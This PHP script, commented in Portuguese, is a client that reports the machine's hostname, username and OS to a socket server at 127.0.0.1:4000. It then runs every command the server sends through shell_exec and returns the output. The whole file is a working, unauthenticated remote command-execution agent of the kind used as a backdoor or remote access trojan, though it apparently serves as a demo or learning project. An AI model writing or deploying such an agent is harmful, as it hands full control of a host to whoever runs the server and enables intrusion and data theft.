<?php

require 'error-handler.php';
require 'register-shutdown-function.php';
require 'socket-constants.php';

require dirname(__DIR__) . '/vendor/autoload.php';

use Ramsey\Uuid\UuidFactory;

$operationSystem = PHP_OS_FAMILY;

// Executa rotinas de descoberta de variáveis de ambiente baseadas no SO anfitrião
if ($operationSystem == 'Windows') {
    exec('echo %USERNAME%', $output);
    $username = $output[0] ?? 'unknown';
    unset($output);
    exec('hostname', $output);
    $hostname = $output[0] ?? 'unknown';
} else {
    exec('whoami', $output);
    $username = $output[0] ?? 'unknown';
    unset($output);
    exec('hostname', $output);
    $hostname = $output[0] ?? 'unknown';
}

echo "Coletou dados do cliente: {$hostname} - {$username} - {$operationSystem}\n";

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

socket_connect($socket, '127.0.0.1', 4000);

echo "Conectado ao socket server\n";

// Monta o payload inicial com a identificação única gerada para o handshake primário
$info = json_encode([
    'hostname' => $hostname,
    'username' => $username,
    'operationSystem' => $operationSystem,
    'uuid' => (new UuidFactory())->uuid4()
]);

$result = socket_write($socket, "INFO_CLIENT:{$info}");

echo "Enviou dados do cliente para o servidor: {$result}\n";

while(true) {
    $response = socket_read($socket, 1024);

    if ($response === false) {
        $socketCode = socket_last_error($socket);

        if (in_array($socketCode, [SOCKET_ERROR_NON_BLOCKING_OPERATION, SOCKET_SUCCESS_CONNECTION])) {
            continue;
        }

        echo socket_strerror($socketCode);
        break;
    }

    // Processa os sinais de execução remota de shell enviados pelo servidor socket central
    if (strpos($response, 'DATA_EVENT:') !== false) {
        echo 'Recebeu command' . PHP_EOL;

        $dataJson = str_replace('DATA_EVENT:', '', $response);
        $dataArray = json_decode($dataJson, true);
        $command = $dataArray['event'];

        echo "COMMAND: {$command}" . PHP_EOL;

        // Dispara a chamada de sistema de baixo nível para a console nativa
        $output = shell_exec($command);

        echo 'Executou command' . PHP_EOL;

        // Executa a conversão de caracteres nativos do prompt Windows para compatibilidade JSON
        if ($operationSystem == 'Windows' && !empty($output)) {
            $output = mb_convert_encoding($output, 'UTF-8', 'CP850');
        }

        $dataJson = json_encode([
            'output' => $output
        ]);

        // Retorna a cadeia de caracteres sanitizada em bloco único TCP
        socket_write($socket, "DATA_EVENT:{$dataJson}");

        echo "Mandou ouput do command para server" . PHP_EOL;
        continue;
    }
}